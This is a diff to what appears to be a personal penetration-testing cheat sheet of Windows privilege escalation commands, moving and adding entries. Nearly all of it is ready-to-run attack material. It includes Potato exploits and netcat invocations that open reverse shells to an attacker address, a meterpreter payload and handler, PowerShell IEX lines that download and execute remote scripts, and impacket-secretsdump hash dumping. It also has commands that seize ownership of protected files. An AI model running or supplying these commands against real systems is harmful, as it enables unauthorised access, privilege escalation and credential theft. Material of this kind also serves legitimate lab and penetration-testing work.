@@ -1102,13 +1102,23 @@ certutil -urlcache -f http://$MYIP:8888/bat2exe.bat \programdata\bat2exe.bat
 
 
 [*] Privilege Escalation
++---------- Priv Check ----------+
+powershell -c "whoami /user /priv"
+
++---------- SeBackupPrivilege ----------+
+robocopy /b \users\administrator\desktop\ .; type \users\administrator\desktop\root.txt
+
++---------- SeImpersonatePrivilege ----------+
+echo -e 'type \\users\\administrator\\desktop\\root.txt' | rlwrap nc -lvnp 5566
+C:\programdata\EfsPotato.exe "C:\programdata\nc.exe $MYIP 5566 -e cmd"
+
 +---------- Initial Checks ----------+
 powershell -c "if ([Environment]::Is64BitOperatingSystem) { '64-bit' } else { '32-bit' }"
 powershell -c "type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-powershell -c "whoami /user /priv"
 powershell -c "whoami /groups|?{$_ -match '^\S+\s+Group'}"
 powershell -c "tree \users /a /f"
 powershell -c "tree \inetpub /a /f"
+powershell -c "tree \xampp /a /f"
 powershell -c "Import-Module ActiveDirectory"
 powershell -c "Get-ADComputer DC01 -property *"
 powershell -c "Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects"
@@ -1137,12 +1147,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f psh -o
 rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/0.ps1')"
 
-+---------- SeBackupPrivilege ----------+
-robocopy /b \Users\Administrator\Desktop .
-
-+---------- SeImpersonatePrivilege ----------+
-echo -e 'type C:\\users\\administrator\\desktop\\root.txt' | rlwrap nc -lvnp 5566
-C:\programdata\EfsPotato.exe "C:\programdata\nc.exe $MYIP 5566 -e cmd"
++---------- Other Exploits ----------+
 C:\programdata\FullPowers.exe -c "C:\programdata\EfsPotato.exe \"C:\programdata\nc.exe $MYIP 5566 -e cmd\"" -z
 C:\programdata\SigmaPotato.exe "C:\programdata\nc.exe $MYIP 5566 -e cmd"
 C:\programdata\jp32.exe -l 1337 -p "cmd.exe" -a "/c \programdata\nc.exe $MYIP 5678 -e cmd"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
@@ -1154,7 +1159,6 @@ Windows 7               {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstal
 Windows 8.1             {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
 Windows 10 Enterprise   {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
 Windows 10 Pro          {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
-
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-SigmaPotato.ps1');Invoke-SigmaPotato -Command \"whoami /user /priv\""
 
 +---------- Dump Hashes (Local / Remote)----------+
@@ -1184,10 +1188,6 @@ impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET
 +---------- File Permissions ----------+
 powershell -c "(Get-Acl 'C:\secret.txt').Access | Format-Table"
 takeown /f "C:\secret.txt" && icacls "C:\secret.txt" /grant %USERNAME%:F /inheritance:e
-
-+---------- System Enumeration ----------+
-dir C:\inetpub\wwwroot
-dir C:\xampp
 
 +---------- Other ----------+
 Get-WmiObject -Class Win32_ComputerSystem | Select-Object Domain
